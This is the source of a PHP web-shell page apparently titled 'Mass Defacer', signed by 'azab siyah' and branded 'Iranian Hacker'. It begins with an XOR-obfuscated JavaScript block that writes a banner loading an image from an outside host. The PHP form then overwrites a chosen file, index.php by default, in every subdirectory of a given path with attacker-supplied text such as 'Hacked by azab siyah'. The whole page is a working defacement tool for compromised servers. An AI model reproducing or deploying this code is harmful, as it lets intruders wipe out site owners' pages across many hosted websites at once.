<script>var enkripsi="'02'1Ajvon'1G'2C'1Ajgcf'1G'2C'1Avkvng'1Gclml{omwq/qga'02vcgo'02Wrnmcfgp'1A-vkvng'1G'2C'1A-jgcf'1G'2C'1A`mf{'02`eamnmp'1F'002222222'00'1G'2C'1Admlv/dcokn{'02'1C'02Vcjmoc'1G'2C'1Aaglvgp'1G'2C'1A`p'1G'2C'1Admlv'02amnmp'1F'00dddddddddd'00'1G//////////////////////////////////////////'1A-dmlv'1G'2C'1A`p'1G'1A`p'1G'2C'1Admlv'02amnmp'1F'00epggl'00'02qkxg'1F'00)3'00'1G'2CRpt:'02Wrnmcfgp'2C'1A`p'1G'1A-dmpo'1G'1Aqrcl'02qv{ng'1F'00dmlv/qkxg'1C12rz'1@'00'1G'1Aqrcl'02qv{ng'1F'00`caiepmwlf'1C'02wpn'0:'04swmv'1@jvvr'1C--wr,kpcl/vcni,kp-wrnmcfq-311375336;1,ekd'04swmv'1@'0;'02pgrgcv/z'02qapmnn'022'07'022'07'02vpclqrcpglv'1@'02amnmp'1C'02pgf'1@'02vgzv/qjcfmu'1C'02:rz'02:rz'0231rz'1@'00'1G'1Aqvpmle'1G'1A`'1G'1A`ke'1Gnn]cxc`]qk{cj]nnB{cjmm,amo'1A-`'1G'1A-`ke'1G'1A-qvpmle'1G'1A`p'1G'2C'1Admlv'02amnmp'1F'00pgf'00'02qkxg'1F'00)3'00'1G'2CQjgnn'02Apgcvgf'02@{'02cxc`'02qk{cj'1A-`p'1G'1A-`ke'1G'2C'1A`p'1G'1A-dmpo'1G'1A`p'1G'1Admlv'02amnmp'1F'00dddddddddd'00'1G//////////////////////////////////////////'1A-dmlv'1G'1A`p'1G"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.write(teksasli);</script>
<font color="green">
Select Your Files :

<br>
<html>
 <?php
echo "<title>Mass Defacer - By azab siyah</title>";
echo "<center><form method='POST'>";
echo "Base Dir : <input type='text' name='base_dir' size='45' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='index.php'><br><br>";
echo "Your Index : <br><textarea style='width: 785px; height: 330px;' name='index'>Hacked by azab siyah</textarea><br>";
echo "<input type='submit' value='Start'></form></center>";

if (isset ($_POST['base_dir']))
{
	if (!file_exists ($_POST['base_dir']))
		die ($_POST['base_dir']." Not Found !<br>");

	if (!is_dir ($_POST['base_dir']))
		die ($_POST['base_dir']." Is Not A Directory !<br>");

	@chdir ($_POST['base_dir']) or die ("Cannot Open Directory");

	$files = @scandir ($_POST['base_dir']) or die ("oohhh shet<br>");

	foreach ($files as $file):
		if ($file != "." && $file != ".." && @filetype ($file) == "dir")
		{
			$index = getcwd ()."/".$file."/".$_POST['file_name'];
			if (@file_put_contents ($index, $_POST['index']))
				echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
		}
	endforeach;
}

?>
<center><h1><span style="font-family: IrisUPC">Iranian Hacker</span></h1></center>
<br>
</html>
